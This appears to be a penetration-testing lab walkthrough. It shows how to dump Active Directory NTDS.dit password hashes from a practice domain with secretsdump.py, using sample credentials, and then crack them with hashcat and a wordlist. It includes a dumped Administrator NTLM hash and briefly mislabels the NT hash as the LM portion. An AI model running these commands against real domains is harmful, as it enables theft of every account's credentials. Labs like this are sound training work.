NTDS.dis is a database to store Active Directory data.

<img width="720" height="317" alt="image" src="https://github.com/user-attachments/assets/3cb0ce35-0a44-4db3-8cbe-a7adcb589523" />

***secretsdump.py MARVEL.local/hawkeye:”Password1@”@192.168.1.100***

<img width="720" height="444" alt="image" src="https://github.com/user-attachments/assets/8ba74198-9e29-4e2d-a7ae-5b21e2eea76d" />

Here we have NTDS.DIT.

Lets filter the attack with NTDS only

***secretsdump.py MARVEL.local/hawkeye:”Password1@”@192.168.1.100 -just-dc-ntlm***

<img width="720" height="261" alt="image" src="https://github.com/user-attachments/assets/8a0f0f3d-1347-4d54-855d-2d67a66e690a" />

Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::

Here we want to crack the NT part of the hash.

Lets put all the LM portion of the hash in a file

<img width="720" height="314" alt="image" src="https://github.com/user-attachments/assets/416f0356-d764-4f26-8782-6989614e7b35" />

***hashcat -m 1000 ntds.txt /usr/share/wordlists/rockyou.txt***

<img width="720" height="503" alt="image" src="https://github.com/user-attachments/assets/88674f00-a67c-4381-8921-6bdcbd18baf8" />

And we got all the passwords

***hashcat -m 1000 ntds.txt /usr/share/wordlists/rockyou.txt --show***

<img width="720" height="187" alt="image" src="https://github.com/user-attachments/assets/cd39c02e-7c60-41a5-8102-32f5d16d2c68" />
